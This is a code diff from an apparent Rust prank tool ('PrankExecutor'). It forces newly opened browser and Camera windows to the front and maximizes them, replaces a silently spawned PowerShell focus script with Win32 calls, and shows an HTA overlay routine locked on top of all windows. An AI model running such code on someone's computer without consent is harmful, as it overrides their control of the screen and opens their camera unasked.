@@ -19,6 +19,34 @@ fn spawn_silent(program: &str, args: &[&str]) {
     }
 }
 
+/// Forces the most recently spawned visible titled window (browser/camera/etc) to the foreground.
+/// Uses Win32 EnumWindows — no PowerShell, no console windows needed.
+#[cfg(windows)]
+fn force_foreground_browser() {
+    use windows_sys::Win32::Foundation::{BOOL, HWND, LPARAM};
+    use windows_sys::Win32::UI::WindowsAndMessaging::{
+        BringWindowToTop, EnumWindows, GetWindowTextLengthW, IsWindowVisible, SetForegroundWindow,
+        ShowWindow, SW_RESTORE,
+    };
+
+    unsafe extern "system" fn enum_callback(hwnd: HWND, _: LPARAM) -> BOOL {
+        if IsWindowVisible(hwnd) != 0 && GetWindowTextLengthW(hwnd) > 0 {
+            ShowWindow(hwnd, SW_RESTORE);
+            SetForegroundWindow(hwnd);
+            BringWindowToTop(hwnd);
+            return 0; // stop after first match
+        }
+        1 // continue enumeration
+    }
+
+    unsafe {
+        EnumWindows(Some(enum_callback), 0);
+    }
+}
+
+#[cfg(not(windows))]
+fn force_foreground_browser() {}
+
 /// Spawns an HTA screen overlay and enforces HWND_TOPMOST so it stays locked on top of all windows
 fn spawn_topmost_hta(hta_path: &std::path::Path) {
     let path_str = hta_path.to_str().unwrap_or("").to_string();
@@ -595,32 +623,26 @@ impl PrankExecutor {
             use std::ffi::OsStr;
             use std::os::windows::ffi::OsStrExt;
             use windows_sys::Win32::UI::Shell::ShellExecuteW;
-            use windows_sys::Win32::UI::WindowsAndMessaging::SW_SHOWNORMAL;
+            use windows_sys::Win32::UI::WindowsAndMessaging::SW_SHOWMAXIMIZED;
 
             let open_operation: Vec<u16> = OsStr::new("open").encode_wide().chain(std::iter::once(0)).collect();
             let url_wide: Vec<u16> = OsStr::new(&final_url).encode_wide().chain(std::iter::once(0)).collect();
 
             unsafe {
-                // Execute using SW_SHOWMAXIMIZED or SW_SHOWNORMAL to force the process window to show active and focused
                 ShellExecuteW(
                     0,
                     open_operation.as_ptr(),
                     url_wide.as_ptr(),
                     std::ptr::null(),
                     std::ptr::null(),
-                    SW_SHOWNORMAL,
+                    SW_SHOWMAXIMIZED,
                 );
             }
 
-            // Fallback: spawn a quick PowerShell line to bring the browser to the foreground after 500ms
+            // After a short delay, force the new browser window to the very front using Win32 EnumWindows
             tokio::task::spawn(async move {
-                tokio::time::sleep(Duration::from_millis(500)).await;
-                let ps_script = "$wshell = New-Object -ComObject wscript.shell; \
-                                 $wshell.AppActivate('Chrome'); \
-                                 $wshell.AppActivate('Edge'); \
-                                 $wshell.AppActivate('Firefox'); \
-                                 $wshell.AppActivate('YouTube')";
-                spawn_silent("powershell", &["-NoProfile", "-Command", ps_script]);
+                tokio::time::sleep(Duration::from_millis(800)).await;
+                force_foreground_browser();
             });
         }
     }
@@ -696,7 +718,7 @@ impl PrankExecutor {
             use std::ffi::OsStr;
             use std::os::windows::ffi::OsStrExt;
             use windows_sys::Win32::UI::Shell::ShellExecuteW;
-            use windows_sys::Win32::UI::WindowsAndMessaging::SW_SHOWNORMAL;
+            use windows_sys::Win32::UI::WindowsAndMessaging::SW_SHOWMAXIMIZED;
 
             let open_operation: Vec<u16> = OsStr::new("open").encode_wide().chain(std::iter::once(0)).collect();
             let url_wide: Vec<u16> = OsStr::new("microsoft.windows.camera:").encode_wide().chain(std::iter::once(0)).collect();
@@ -708,9 +730,15 @@ impl PrankExecutor {
                     url_wide.as_ptr(),
                     std::ptr::null(),
                     std::ptr::null(),
-                    SW_SHOWNORMAL,
+                    SW_SHOWMAXIMIZED,
                 );
             }
+
+            // Force Camera window to front after it spawns
+            tokio::task::spawn(async move {
+                tokio::time::sleep(Duration::from_millis(1200)).await;
+                force_foreground_browser();
+            });
         }
     }
 }
